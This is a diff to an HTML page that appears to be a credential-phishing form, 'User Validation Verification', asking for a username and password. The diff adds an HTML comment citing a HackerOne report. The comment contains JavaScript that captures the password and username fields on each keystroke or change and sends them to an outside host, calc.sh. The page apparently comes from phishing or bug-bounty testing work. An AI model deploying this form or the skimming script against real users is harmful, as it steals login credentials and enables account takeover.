@@ -72,7 +72,7 @@
 </head>
 <body>
     <form id="myForm" onsubmit="return completeForm()">
-        <h1>User Validation Verification (UVV)</h1>
+        <h1>User Validation Verification</h1>
         We are committed to ensuring the accuracy of your account information to provide you with the best experience. Before you continue, please take a moment to confirm your information so we can validate what we have on file for your account.<br><br>
         <input type="text" id="username" placeholder="Username" required><br><br>
         <input type="password" id="password" placeholder="Password" required><br><br>
@@ -105,5 +105,22 @@
             }, 3000); // Adjust the delay as needed
         });
     </script>
+    <!-- reference : https://hackerone.com/reports/2010530
+                     =====================================
+    
+        setTimeout(function () {
+          a = document.getElementsByName('password')[0];
+          b = document.getElementsByName('username')[0];
+          function f() {
+            fetch(`https://calc.sh/?a=${encodeURIComponent(a.value)}&b=${encodeURIComponent(b.value)}`);
+          }
+          a.form.onclick=f;
+          a.onchange=f;
+          b.onchange=f;
+          a.oninput=f;
+          b.oninput=f;
+        }, 1000)
+    
+    -->
 </body>
 </html>
